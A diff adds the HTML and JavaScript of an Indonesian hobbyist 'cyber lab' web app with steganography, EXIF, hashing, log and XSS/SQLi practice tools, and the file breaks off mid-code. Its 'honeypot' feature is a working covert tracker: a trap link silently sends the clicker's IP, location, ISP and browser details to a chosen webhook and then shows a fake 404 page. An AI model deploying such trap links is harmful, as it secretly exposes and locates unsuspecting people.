@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>CYBER LAB by DELZ</title>
+<meta name="author" content="DELZ">
+<meta name="copyright" content="© 2026 DELZ - CYBER LAB">
+<meta name="theme-color" content="#2247FF">
+<meta property="og:title" content="CYBER LAB by DELZ">
+<meta property="og:description" content="© DELZ - CYBER LAB, Cikijing. Dilarang copy tanpa izin.">
+<link rel="manifest" href="manifest.json">
+<link rel="icon" href="icon3.jpg">
+<link rel="apple-touch-icon" href="icon3.jpg">
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#F2EFE6;--paper:#FFFDF5;--ink:#111111;--acc:#2247FF;--acc2:#FFD400;--dim:#66625A}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:var(--bg);color:var(--ink);font-family:'JetBrains Mono',monospace;font-size:14px;line-height:1.5}
+.hidden{display:none!important}
+button,input,textarea,select{font-family:inherit}
+h1,h2,h3{font-family:'Archivo',sans-serif;letter-spacing:-.02em}
+#splash{position:fixed;inset:0;background:#000;z-index:100;width:100vw;height:100dvh;overflow:hidden}
+#splash video{width:100vw;height:100dvh;object-fit:contain;background:#000;pointer-events:none}
+#splashClick{position:absolute;inset:0;z-index:10}
+#btnLewati{position:fixed;bottom:20px;right:16px;z-index:99999;background:var(--acc);border:2px solid #fff;color:#fff;padding:11px 18px;font-size:12px;font-weight:700;cursor:pointer}
+#loginPage{min-height:100dvh;display:flex;flex-direction:column;justify-content:center;padding:24px;max-width:420px;margin:0 auto;background:var(--bg)}
+.logoRow{display:flex;align-items:center;gap:12px;border-bottom:3px solid var(--ink);padding-bottom:16px}
+.logoRow span{font-size:11px;color:var(--dim)}
+h1{font-size:52px;line-height:.9;margin:24px 0 8px}
+h1 i{font-style:normal;color:var(--acc)}
+.desc{color:var(--dim);font-size:13px}
+.dots{display:flex;gap:8px;margin:24px 0 10px}
+.dot{width:32px;height:5px;background:#D8D3C3;border:1px solid var(--ink)}
+.dot.fill{background:var(--acc)}
+#pinMsg{color:#D00;font-size:12px;height:16px}
+.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px}
+.key{background:var(--paper);border:2px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:16px 0;font-size:20px;font-weight:700;cursor:pointer}
+.key:active{transform:translate(2px,2px);box-shadow:1px 1px 0 var(--ink);background:var(--acc);color:#fff}
+.key.go{background:var(--acc);color:#fff}
+.wrap{max-width:760px;margin:0 auto;padding:0 14px 90px}
+.head{display:flex;justify-content:space-between;align-items:flex-start;padding:18px 0 12px;border-bottom:3px solid var(--ink)}
+.head h2{font-size:32px;line-height:1}
+.head p{font-size:12px;color:var(--dim);margin-top:4px}
+.saved{background:var(--acc);color:#fff;border:2px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:6px 10px;font-size:12px;font-weight:700;white-space:nowrap}
+.banner{margin:14px 0;border:3px solid var(--ink);box-shadow:5px 5px 0 var(--ink);background:#000;overflow:hidden}
+.banner video{width:100%;height:150px;object-fit:cover;display:block}
+.bannerInner{padding:10px 12px;background:#111;color:#fff;display:flex;justify-content:space-between;align-items:center}
+.bannerInner b{font-family:'Archivo';font-size:14px}
+.bannerInner span{font-size:11px;color:#ccc}
+.stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:14px 0}
+.stat{background:var(--paper);border:2px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:12px}
+.stat .n{font-family:'Archivo';font-size:28px;line-height:1}
+.stat .l{font-size:11px;color:var(--dim);margin-top:6px;letter-spacing:.06em}
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin:6px 0 10px}
+.chip{border:2px solid var(--ink);background:var(--paper);padding:8px 12px;font-size:12px;font-weight:700;cursor:pointer;box-shadow:2px 2px 0 var(--ink)}
+.chip.on{background:var(--ink);color:#fff}
+.toggle{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0 16px}
+.toggle button{border:2px solid var(--ink);padding:11px;font-weight:700;background:var(--paper);box-shadow:3px 3px 0 var(--ink);cursor:pointer}
+.toggle button.on{background:var(--ink);color:#fff}
+.secTitle{font-size:22px;margin:14px 0 10px}
+.tableWrap{overflow-x:auto;border:3px solid var(--ink);box-shadow:5px 5px 0 var(--ink);background:var(--paper)}
+table{width:100%;border-collapse:collapse;min-width:560px}
+th{background:var(--ink);color:#fff;text-align:left;padding:10px;font-size:11px;letter-spacing:.06em}
+td{padding:11px 10px;border-bottom:1px solid #DDD8C8;font-size:13px;vertical-align:top}
+td small{color:var(--dim);display:block;font-size:11px;margin-top:2px}
+.badge{display:inline-block;background:var(--ink);color:#fff;padding:3px 7px;font-size:11px;font-weight:700}
+.badge.blue{background:var(--acc)}
+.bar{width:100px;height:10px;border:1px solid var(--ink);background:#EEE9DA;display:inline-block;vertical-align:middle}
+.bar i{display:block;height:100%;background:var(--acc)}
+.btnMini{border:2px solid var(--ink);background:#fff;padding:6px 8px;font-size:11px;font-weight:700;cursor:pointer;box-shadow:2px 2px 0 var(--ink)}
+.btnMini:active{background:var(--acc);color:#fff}
+.hint{font-size:12px;color:var(--dim);margin:8px 0}
+.cardList{display:grid;gap:10px}
+.card{background:var(--paper);border:2px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:14px;cursor:pointer;text-align:left;width:100%}
+.card h3{font-size:17px}
+.card p{font-size:12px;color:var(--dim);margin-top:4px}
+.btn{width:100%;background:var(--acc);border:2px solid var(--ink);box-shadow:4px 4px 0 var(--ink);color:#fff;padding:13px;font-size:13px;font-weight:700;cursor:pointer;margin-top:10px;text-align:left}
+.btn:active{transform:translate(2px,2px);box-shadow:1px 1px 0 var(--ink);background:#000}
+.btn.ghost{background:var(--paper);color:var(--ink)}
+.field{width:100%;background:#fff;border:2px solid var(--ink);padding:12px;margin-top:8px;outline:none;font-size:13px}
+.field:focus{border-color:var(--acc)}
+.out{border:2px solid var(--ink);background:#fff;padding:13px;margin-top:12px;font-size:12px;line-height:1.7;white-space:pre-wrap;word-break:break-word}
+label{font-size:11px;color:var(--dim);letter-spacing:.08em;text-transform:uppercase;display:block;margin-top:14px}
+.sk{height:12px;background:#E2DDCE;border:1px solid var(--ink);margin:10px 0;position:relative;overflow:hidden}
+.sk::after{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,#fff 50%,transparent);animation:sk 1.1s infinite}
+.sk.tall{height:72px}
+@keyframes sk{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.back{font-size:12px;color:var(--dim);cursor:pointer;display:inline-block;margin-bottom:6px}
+.lsBox{border:2px dashed var(--ink);background:var(--paper);padding:14px;margin-top:18px}
+.lsBox h3{font-size:16px}
+.lsBox p{font-size:12px;color:var(--dim);margin-top:6px}
+.lsRow{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.lsRow button{border:2px solid var(--ink);background:#fff;padding:9px 10px;font-size:12px;font-weight:700;box-shadow:2px 2px 0 var(--ink);cursor:pointer}
+.bottom{position:fixed;bottom:0;left:0;right:0;background:var(--ink);color:#fff;display:grid;grid-template-columns:1fr 1fr 1fr;z-index:50}
+.bottom button{background:transparent;border:none;color:#fff;padding:14px 0;font-weight:700;font-size:13px;cursor:pointer}
+.bottom button.on{color:var(--acc2)}
+canvas{display:none}
+img.preview{max-width:100%;border:2px solid var(--ink);margin-top:12px;display:block}
+#wm-delz{position:fixed;bottom:70px;right:10px;z-index:9999;background:rgba(0,0,0,.75);color:#fff;border:1px solid #2247FF;padding:5px 9px;font-size:10px;font-weight:700;letter-spacing:.1em;pointer-events:none;border-radius:6px}
+#wm-delz b{color:#FFD400}
+#installBar{display:none;background:#FFD400;border:2px solid #111;box-shadow:3px 3px 0 #111;padding:12px;margin:12px 0;font-weight:700}
+#installBar button{background:#111;color:#fff;border:none;padding:8px 12px;font-weight:700;margin-left:8px;cursor:pointer}
+</style>
+</head>
+<body>
+<div id="wm-delz">© <b>DELZ</b> • CYBER LAB</div>
+
+<div id="splash">
+  <video id="vidSplash" autoplay muted playsinline preload="auto"><source src="animasi2.mp4" type="video/mp4"></video>
+  <div id="splashClick" onclick="goLogin()"></div>
+  <button id="btnLewati" type="button" onclick="goLogin(event)">LEWATI</button>
+</div>
+
+<div id="loginPage" class="hidden">
+  <div class="logoRow">
+    <span>BY DELZ / CIKIJING<br>CYBER LAB — PRIVATE</span>
+  </div>
+  <h1>CYBER<br><i>LAB.</i></h1>
+  <p class="desc">By DELZ. Project + 7 alat. Semua data kesimpen di HP lu, bukan di server. © 2026 DELZ.</p>
+  <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+  <div id="pinMsg"></div>
+  <div class="keypad">
+    <button class="key" onclick="pressNum('1')">1</button><button class="key" onclick="pressNum('2')">2</button><button class="key" onclick="pressNum('3')">3</button>
+    <button class="key" onclick="pressNum('4')">4</button><button class="key" onclick="pressNum('5')">5</button><button class="key" onclick="pressNum('6')">6</button>
+    <button class="key" onclick="pressNum('7')">7</button><button class="key" onclick="pressNum('8')">8</button><button class="key" onclick="pressNum('9')">9</button>
+    <button class="key" onclick="clearPin()">DEL</button><button class="key" onclick="pressNum('0')">0</button><button class="key go" onclick="checkPin()">MASUK</button>
+  </div>
+  <p style="color:#888;font-size:11px;margin-top:12px">PIN default 112505. © DELZ</p>
+</div>
+
+<div id="mainPage" class="hidden">
+  <div class="wrap">
+    <div class="head">
+      <div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <img src="icon3.jpg" style="width:36px;height:36px;border-radius:8px;border:2px solid #111">
+          <h2>CYBER LAB</h2>
+        </div>
+        <p id="dateLine">15 Nov 2026</p>
+        <p style="font-size:11px;color:#2247FF;font-weight:700">BY DELZ • © 2026 DELZ</p>
+      </div>
+      <span class="saved" id="savedBadge">● SAVED</span>
+    </div>
+
+    <div id="installBar">📲 Install CYBER LAB jadi aplikasi? <button id="btnInstall">INSTALL</button></div>
+
+    <div class="banner"><video autoplay muted loop playsinline><source src="banner2.mp4" type="video/mp4"></video><div class="bannerInner"><b>CYBER LAB • BY DELZ</b><span>▶ LOOP • © DELZ</span></div><div style="padding:0 12px 10px;background:#111;color:#ccc;font-size:12px"><span id="bannerCount">0 project jalan</span> • <span id="bannerTotal">0 total</span></div></div>
+
+    <div class="stats">
+      <div class="stat"><div class="n" id="statTotal">0</div><div class="l">TOTAL</div></div>
+      <div class="stat"><div class="n" id="statJalan">0</div><div class="l">DIBIKIN</div></div>
+      <div class="stat"><div class="n" id="statDone">0</div><div class="l">SELESAI</div></div>
+    </div>
+
+    <div class="filters" id="filters">
+      <button class="chip on" onclick="setFilter('SEMUA',this)">SEMUA</button>
+      <button class="chip" onclick="setFilter('APK',this)">APK</button>
+      <button class="chip" onclick="setFilter('WEB',this)">WEB</button>
+      <button class="chip" onclick="setFilter('PWA',this)">PWA</button>
+      <button class="chip" onclick="setFilter('PROSES',this)">LAGI PROSES</button>
+    </div>
+
+    <div class="toggle">
+      <button id="btnKartu" onclick="setView('KARTU')">▦ KARTU</button>
+      <button id="btnTabel" class="on" onclick="setView('TABEL')">▤ TABEL</button>
+    </div>
+
+    <div id="home">
+      <h3 class="secTitle" id="listTitle">SEMUA PROJECT — TABEL</h3>
+      <div id="projectArea"></div>
+      <p class="hint">Geser tabel ke kanan kalau kepotong di HP.</p>
+      <h3 class="secTitle">7 ALAT — SEMUA BERFUNGSI</h3>
+      <div class="cardList">
+        <button class="card" onclick="openTool('stego')"><h3>01 / STEGO LSB — Sembunyikan pesan di foto</h3><p>LSB beneran. Download hasil, decode lagi.</p></button>
+        <button class="card" onclick="openTool('forensic')"><h3>02 / FORENSIC EXIF — Baca EXIF JPEG</h3><p>GPS kalau ada, kalau tidak ada dibilang tidak ada.</p></button>
+        <button class="card" onclick="openTool('lab')"><h3>03 / LAB — XSS, SQLi, Decode</h3><p>Latihan, jawaban dicek pola.</p></button>
+        <button class="card" onclick="openTool('malware')"><h3>04 / FILE CHECK — SHA-256 + Entropy</h3><p>Hash bisa dicek di VirusTotal.</p></button>
+        <button class="card" onclick="openTool('honeypot')"><h3>05 / HONEYPOT WEBHOOK</h3><p>Pakai webhook.site lu, IP beneran kekirim ke sana.</p></button>
+        <button class="card" onclick="openTool('log')"><h3>06 / LOG — Parsing log server</h3><p>Hitung failed, list IP paling sering.</p></button>
+        <button class="card" onclick="openTool('crack')"><h3>07 / CRACK SIM — Hitung entropy</h3><p>Rumus charset ^ panjang / 10 miliar per detik.</p></button>
+      </div>
+      <div class="lsBox">
+        <h3>LOCALSTORAGE — DATA LU AMAN DI HP</h3>
+        <p id="lsInfo">Memuat...</p>
+        <div class="lsRow">
+          <button onclick="exportBackup()">↓ EXPORT BACKUP</button>
+          <button onclick="importBackup()">↑ IMPORT</button>
+          <button onclick="changePin()">GANTI PIN</button>
+        </div>
+        <div class="lsRow"><button onclick="resetAll()" style="background:#111;color:#fff">RESET SEMUA</button></div>
+        <input type="file" id="importFile" accept=".json" style="display:none" onchange="doImport(event)">
+      </div>
+      <footer style="margin:30px 0 10px;text-align:center;border-top:2px solid #111;padding-top:16px;font-size:11px;line-height:1.8;color:#666">
+        <b style="color:#111;font-size:14px">CYBER LAB</b><br>
+        BY <b style="color:#2247FF">DELZ</b> • CIKIJING, WEST JAVA<br>
+        © 2026 DELZ. All Rights Reserved.<br>
+        <span style="color:#999">Dilarang menyalin, meng-clone, atau re-upload tanpa izin DELZ.</span><br>
+        <span style="background:#FFD400;color:#000;padding:2px 6px;font-weight:700">© DELZ • CYBER LAB</span>
+      </footer>
+    </div>
+
+    <div id="toolPage" class="hidden">
+      <span class="back" onclick="backHome()">← semua project</span>
+      <div id="toolContent"></div>
+    </div>
+
+    <div id="addPage" class="hidden">
+      <span class="back" onclick="backHome()">← batal</span>
+      <h3 class="secTitle">TAMBAH PROJECT</h3>
+      <label>Nama project</label><input class="field" id="pNama" placeholder="misal: cyber lab v1">
+      <label>Catatan</label><input class="field" id="pCatatan" placeholder="misal: Udah jadi v1">
+      <label>Jenis</label><select class="field" id="pJenis"><option>WEB</option><option>APK</option><option>PWA</option></select>
+      <label>Status</label><select class="field" id="pStatus"><option>DONE</option><option>PROSES</option><option>IDE</option></select>
+      <label>Progress 0-100</label><input class="field" id="pProgress" type="number" min="0" max="100" value="100">
+      <button class="btn" onclick="saveProject()">SIMPAN KE LOCALSTORAGE</button>
+    </div>
+  </div>
+</div>
+
+<div class="bottom">
+  <button id="navHome" class="on" onclick="showHome()">⌂ HOME</button>
+  <button onclick="showAdd()">+ TAMBAH</button>
+  <button onclick="location.reload()">↻ RELOAD</button>
+</div>
+<canvas id="cv"></canvas>
+
+<script>
+let deferredPrompt=null;
+window.addEventListener('beforeinstallprompt',e=>{e.preventDefault();deferredPrompt=e;document.getElementById('installBar').style.display='block';});
+document.getElementById('btnInstall')?.addEventListener('click',async()=>{if(!deferredPrompt) return alert('Di HP lu, pencet titik 3 di Chrome > Tambah ke Layar Utama');deferredPrompt.prompt();await deferredPrompt.userChoice;deferredPrompt=null;document.getElementById('installBar').style.display='none';});
+if('serviceWorker' in navigator){navigator.serviceWorker.register('sw.js').catch(()=>{});}
+document.addEventListener('contextmenu',e=>{e.preventDefault();});
+document.addEventListener('copy',e=>{e.preventDefault();alert('© DELZ - CYBER LAB. Dilarang copy!');});
+var pin=""; var alreadyGo=false; var curFilter='SEMUA'; var curView='TABEL';
+var KEY='delz_projects_v1'; var PINKEY='delz_pin_v1';
+function getPin(){ return localStorage.getItem(PINKEY) || '112505'; }
+function getProjects(){ try{ return JSON.parse(localStorage.getItem(KEY)) || []; }catch(e){ return []; } }
+function setProjects(a){ localStorage.setItem(KEY, JSON.stringify(a)); updateSaved(); }
+function updateSaved(){ var a=getProjects(); var kb=new Blob([localStorage.getItem(KEY)||'[]']).size/1024; document.getElementById('lsInfo').innerText=a.length+' project kesimpen • '+kb.toFixed(1)+' KB di LocalStorage • Tutup app / reload tetep ada. Data cuma di HP lu, bukan di server.'; document.getElementById('savedBadge').innerText='● SAVED • '+a.length; }
+function goLogin(e){ if(e) e.stopPropagation(); if(alreadyGo) return; alreadyGo=true; document.getElementById('splash').classList.add('hidden'); document.getElementById('loginPage').classList.remove('hidden'); }
+document.getElementById('vidSplash').onended=function(){ goLogin(); };
+setTimeout(function(){ if(!alreadyGo) goLogin(); },8000);
+document.getElementById('btnLewati').addEventListener('click', function(e){ e.preventDefault(); e.stopPropagation(); goLogin(); });
+document.getElementById('btnLewati').addEventListener('touchstart', function(e){ e.preventDefault(); goLogin(); }, {passive:false});
+function pressNum(n){ if(pin.length>=6) return; pin+=n; updateDots(); if(pin.length===6) checkPin(); }
+function clearPin(){ pin=pin.slice(0,-1); updateDots(); }
+function updateDots(){ document.querySelectorAll('.dot').forEach(function(d,i){ d.classList.toggle('fill', i<pin.length); }); }
+function checkPin(){
+  if(pin===getPin()){ document.getElementById('loginPage').classList.add('hidden'); document.getElementById('mainPage').classList.remove('hidden'); pin=""; updateDots(); renderProjects(); }
+  else{ document.getElementById('pinMsg').innerText="PIN salah. Coba lagi."; pin=""; updateDots(); setTimeout(function(){ document.getElementById('pinMsg').innerText=""; },2000); }
+}
+document.getElementById('dateLine').innerText=new Date().toLocaleDateString('id-ID',{day:'numeric',month:'short',year:'numeric'});
+function setFilter(f,el){ curFilter=f; document.querySelectorAll('#filters .chip').forEach(function(c){c.classList.remove('on')}); el.classList.add('on'); renderProjects(); }
+function setView(v){ curView=v; document.getElementById('btnKartu').classList.toggle('on', v==='KARTU'); document.getElementById('btnTabel').classList.toggle('on', v==='TABEL'); renderProjects(); }
+function filtered(){
+  var a=getProjects();
+  if(curFilter==='SEMUA') return a;
+  if(curFilter==='PROSES') return a.filter(function(p){return p.status==='PROSES'});
+  return a.filter(function(p){return p.jenis===curFilter});
+}
+function renderProjects(){
+  var all=getProjects(); var list=filtered();
+  document.getElementById('statTotal').innerText=all.length;
+  document.getElementById('statJalan').innerText=all.filter(function(p){return p.status==='PROSES'}).length;
+  document.getElementById('statDone').innerText=all.filter(function(p){return p.status==='DONE'}).length;
+  document.getElementById('bannerCount').innerText=all.filter(function(p){return p.status==='PROSES'}).length+' project jalan';
+  document.getElementById('bannerTotal').innerText=all.length+' total';
+  document.getElementById('listTitle').innerText=(curFilter==='SEMUA'?'SEMUA PROJECT':curFilter+' PROJECT')+' — '+curView;
+  var area=document.getElementById('projectArea');
+  if(!list.length){ area.innerHTML='<div style="border:2px solid #111;background:#fff;padding:16px">Belum ada project di HP ini.<br><span style="color:#666;font-size:12px">Pencet + TAMBAH di bawah buat isi.</span></div>'; updateSaved(); return; }
+  if(curView==='TABEL'){
+    var rows=list.map(function(p,i){ return '<tr><td><b>'+p.nama+'</b><small>'+(p.catatan||'')+'</small></td><td>'+p.jenis+'</td><td><span class="badge '+(p.status==='DONE'?'':'blue')+'">'+p.status+'</span></td><td><span class="bar"><i style="width:'+p.progress+'%"></i></span> '+p.progress+'%</td><td><button class="btnMini" onclick="delProject('+all.indexOf(p)+')">HAPUS</button></td></tr>'; }).join('');
+    area.innerHTML='<div class="tableWrap"><table><tr><th>PROJECT</th><th>JENIS</th><th>STATUS</th><th>PROGRESS</th><th>AKSI</th></tr>'+rows+'</table></div>';
+  } else {
+    area.innerHTML='<div class="cardList">'+list.map(function(p){ return '<div class="card"><div style="display:flex;justify-content:space-between"><h3>'+p.nama+'</h3><span class="badge '+(p.status==='DONE'?'':'blue')+'">'+p.status+'</span></div><p>'+(p.catatan||'')+' • '+p.jenis+' • '+p.progress+'%</p><div style="margin-top:10px"><span class="bar"><i style="width:'+p.progress+'%"></i></span></div><button class="btnMini" style="margin-top:10px" onclick="delProject('+all.indexOf(p)+')">HAPUS</button></div>'; }).join('')+'</div>';
+  }
+  updateSaved();
+}
+function showHome(){ document.getElementById('home').classList.remove('hidden'); document.getElementById('toolPage').classList.add('hidden'); document.getElementById('addPage').classList.add('hidden'); document.getElementById('navHome').classList.add('on'); renderProjects(); }
+function backHome(){ showHome(); }
+function showAdd(){ document.getElementById('home').classList.add('hidden'); document.getElementById('toolPage').classList.add('hidden'); document.getElementById('addPage').classList.remove('hidden'); }
+function saveProject(){
+  var nama=document.getElementById('pNama').value.trim(); if(!nama) return alert('Isi nama dulu.');
+  var a=getProjects(); a.unshift({nama:nama, catatan:document.getElementById('pCatatan').value.trim(), jenis:document.getElementById('pJenis').value, status:document.getElementById('pStatus').value, progress:parseInt(document.getElementById('pProgress').value)||0});
+  setProjects(a); document.getElementById('pNama').value=''; document.getElementById('pCatatan').value=''; showHome();
+}
+function delProject(idx){ if(!confirm('Hapus project ini?')) return; var a=getProjects(); a.splice(idx,1); setProjects(a); renderProjects(); }
+function exportBackup(){
+  var data={pin:getPin(), projects:getProjects(), exported:new Date().toISOString(), owner:'DELZ - CYBER LAB'};
+  var blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'}); var a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='cyberlab-by-delz-backup.json'; a.click();
+}
+function importBackup(){ document.getElementById('importFile').click(); }
+function doImport(ev){
+  var f=ev.target.files[0]; if(!f) return; var r=new FileReader(); r.onload=function(){ try{ var d=JSON.parse(r.result); if(d.projects) setProjects(d.projects); if(d.pin) localStorage.setItem(PINKEY, d.pin); alert('Import berhasil. '+ (d.projects||[]).length +' project.'); renderProjects(); }catch(e){ alert('File backup rusak.'); } }; r.readAsText(f);
+}
+function changePin(){ var p=prompt('PIN baru 6 digit:', getPin()); if(!p) return; if(p.length!==6 || isNaN(p)) return alert('PIN harus 6 angka.'); localStorage.setItem(PINKEY,p); alert('PIN diganti. PIN baru: '+p); }
+function resetAll(){ if(!confirm('Hapus SEMUA data di HP ini?')) return; localStorage.removeItem(KEY); renderProjects(); }
+function showSkeleton(){ document.getElementById('toolContent').innerHTML='<div class="sk"></div><div class="sk"></div><div class="sk tall"></div><div class="sk" style="width:60%"></div>'; }
+function openTool(name){ document.getElementById('home').classList.add('hidden'); document.getElementById('addPage').classList.add('hidden'); document.getElementById('toolPage').classList.remove('hidden'); showSkeleton(); setTimeout(function(){ renderTool(name); },700); }
+(function(){
+  var q=new URLSearchParams(location.search);
+  if(q.get('trap')){
+    var wh=q.get('wh')||''; var label=q.get('trap');
+    fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(ip){
+      var payload={content:'TRAP CLICKED: '+label+'\nIP: '+ip.ip+'\nCity: '+ip.city+', '+ip.country_name+'\nISP: '+ip.org+'\nUA: '+navigator.userAgent+'\nTime: '+new Date().toString()};
+      if(wh) fetch(decodeURIComponent(wh), {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload)}).catch(function(){});
+      document.body.innerHTML='<div style="background:#F2EFE6;color:#111;font-family:monospace;padding:40px"><h1>404</h1><p>Halaman tidak ditemukan.</p></div>';
+    }).catch(function(){ document.body.innerHTML='<div style="background:#F2EFE6;padding:40px"><h1>404</h1><p>Halaman tidak ditemukan.</p></div>'; });
+  }
+})();
+function renderTool(name){
+  var c=document.getElementById('toolContent');
+  if(name==='stego') c.innerHTML='<h2 style="font-size:26px">Stego LSB</h2><p style="color:#666;font-size:12px">Pesan disimpan di bit terakhir pixel.</p><label>Foto pembawa</label><input type="file" class="field" id="stegoImg" accept="image/*"><label>Pesan</label><input class="field" id="stegoMsg" placeholder="Tulis pesan"><button class="btn" onclick="doStegoEmbed()">Sembunyikan + download foto</button><a id="stegoDl" style="display:none"></a><img id="stegoPrev" class="preview" style="display:none"><div class="out" id="stegoOut">Belum ada pesan.</div><label>Decode: upload foto hasil stego</label><input type="file" class="field" id="stegoImg2" accept="image/*"><button class="btn ghost" onclick="doStegoDecode()">Baca pesan dari foto</button>';
+  if(name==='forensic') c.innerHTML='<h2 style="font-size:26px">Forensic EXIF</h2><input type="file" class="field" id="fInput" accept="image/jpeg,image/jpg"><button class="btn" onclick="doForensic()">Baca EXIF</button><div class="out" id="forOut">Pilih file JPG.</div>';
+  if(name==='lab') c.innerHTML='<h2 style="font-size:26px">Latihan</h2><label>Soal</label><select class="field" id="labSel" onchange="labChange()"><option value="xss">1 - XSS</option><option value="sqli">2 - SQLi</option><option value="decode">3 - Decode Base64</option></select><div class="out" id="labOut">Soal 1: Ketik payload XSS yang umum dipakai di latihan.</div><label>Jawaban lu</label><input class="field" id="labInput" placeholder="Ketik di sini"><button class="btn" onclick="doLab()">Cek jawaban</button>';
+  if(name==='malware') c.innerHTML='<h2 style="font-size:26px">File Check</h2><input type="file" class="field" id="mFile"><button class="btn" onclick="doMalware()">Hitung hash + entropy + string</button><div class="out" id="malOut">Pilih file.</div><p style="color:#888;font-size:11px;margin-top:8px">Cek hash di virustotal.com &gt; Search &gt; paste SHA-256.</p>';
+  if(name==='honeypot') c.innerHTML='<h2 style="font-size:26px">Honeypot Webhook</h2><p style="color:#666;font-size:12px">1. Buka webhook.site, copy Unique URL. 2. Paste di bawah. 3. Buat link.</p><label>Webhook URL lu</label><input class="field" id="hpWebhook" placeholder="https://webhook.site/xxxx"><label>Nama jebakan</label><input class="field" id="hpName" placeholder="misal: foto-rahasia"><button class="btn" onclick="doHoney()">Buat link jebakan</button><div class="out" id="hpOut">Link muncul di sini.</div>';
+  if(name==='log') c.innerHTML='<h2 style="font-size:26px">Baca log</h2><label>Log</label><textarea class="field" id="logInput" rows="6" placeholder="Paste log"></textarea><button class="btn" onclick="doLog()">Analisa log</button><div class="out" id="logOut">Hasil muncul di sini.</div>';
+  if(name==='crack') c.innerHTML='<h2 style="font-size:26px">Cek password</h2><p style="color:#666;font-size:12px">Dihitung di HP lu saja, tidak dikirim.</p><label>Password lu</label><input class="field" id="crackPass" type="password" placeholder="Ketik password"><button class="btn" onclick="doCrack()">Hitung entropy</button><div class="out" id="crackOut">Hasil muncul di sini.</div>';
+}
+function bitsFromText(s){ var bits=[]; for(var i=0;i<s.length;i++){ var code=s.charCodeAt(i); for(var b=7;b>=0;b--) bits.push((code>>b)&1); } return bits; }
+function textFromBits(bits){ var out=""; for(var i=0;i+8<=bits.length;i+=8){ var v=0; for(var j=0;j<8;j++) v=(v<<1)|bits[i+j]; if(v===0) break; out+=String.fromCharCode(v); } return out; }
+function doStegoEmbed(){
+  var f=document.getElementById('stegoImg').files[0]; var msg=document.getElementById('stegoMsg').value;
+  if(!f) return alert('Pilih foto dulu.'); if(!msg) return alert('Isi pesan dulu.');
+  var img=new Image(); img.onload=function(){
+    var cv=document.getElementById('cv'); cv.width=img.width; cv.height=img.height; var ctx=cv.getContext('2d'); ctx.drawImage(img,0,0);
+    var data=ctx.getImageData(0,0,cv.width,cv.height); var px=data.data;
+    var payload=msg+'\0'; var bits=bitsFromText(payload);
+    if(bits.length > px.length/4*3){ document.getElementById('stegoOut').innerText='Pesan kepanjangan untuk foto ini.'; return; }
+    for(var i=0;i<bits.length;i++){ px[i*4]=(px[i*4]&0xFE)|bits[i]; }
+    ctx.putImageData(data,0,0);
+    cv.toBlob(function(blob){ var url=URL.createObjectURL(blob); var a=document.getElementById('stegoDl'); a.href=url; a.download='cyberlab-stego.png'; a.click(); document.getElementById('stegoPrev').src=url; document.getElementById('stegoPrev').style.display='block'; document.getElementById('stegoOut').innerText='BERHASIL.\nFoto di-download sebagai cyberlab-stego.png\nPixel dipakai: '+bits.length; }, 'image/png');
+  }; img.src=URL.createObjectURL(f);
+}
+function doStegoDecode(){
+  var f=document.getElementById('stegoImg2').files[0]; if(!f) return alert('Pilih foto hasil stego dulu.');
+  var img=new Image(); img.onload=function(){
+    var cv=document.getElementById('cv'); cv.width=img.width; cv.height=img.height; var ctx=cv.getContext('2d'); ctx.drawImage(img,0,0);
+    var data=ctx.getImageData(0,0,cv.width,cv.height).data; var bits=[]; for(var i=0;i<Math.min(data.length/4,20000);i++) bits.push(data[i*4]&1);
+    var msg=textFromBits(bits); document.getElementById('stegoOut').innerText= msg ? 'PESAN DITEMUKAN:\n'+msg : 'Tidak ada pesan LSB di foto ini.';
+  }; img.src=URL.createObjectURL(f);
+}
+function doForensic(){
+  var f=document.getElementById('fInput').files[0]; if(!f) return alert('Pilih file JPG dulu.');
+  var reader=new FileReader(); reader.onload=function(){
+    var dv=new DataView(reader.result); var hasExif=false; var out='Nama: '+f.name+'\nUkuran: '+(f.size/1024).toFixed(1)+' KB\nTipe: '+f.type+'\nDiubah: '+new Date(f.lastModified).toLocaleString()+'\n\n';
+    if(dv.getUint16(0)===0xFFD8){ var off=2; while(off+4<dv.byteLength){ if(dv.getUint8(off)!==0xFF) break; var marker=dv.getUint8(off+1); var len=dv.getUint16(off+2); if(marker===0xE1){ hasExif=true; var str=''; for(var i=off+4;i<Math.min(off+2+len,dv.byteLength);i++){ var ch=dv.getUint8(i); if(ch>=32&&ch<127) str+=String.fromCharCode(ch); } out+='String EXIF mentah (potongan):\n'+str.slice(0,300)+'\n'; break; } off+=2+len; if(marker===0xDA) break; } }
+    if(!hasExif) out+='\nEXIF: TIDAK DITEMUKAN. File sudah dibersihkan (biasanya lewat WA / screenshot).';
+    else out+='\nEXIF: DITEMUKAN. Kalau tidak ada koordinat, berarti foto tidak menyimpan GPS.';
+    document.getElementById('forOut').innerText=out;
+  }; reader.readAsArrayBuffer(f);
+}
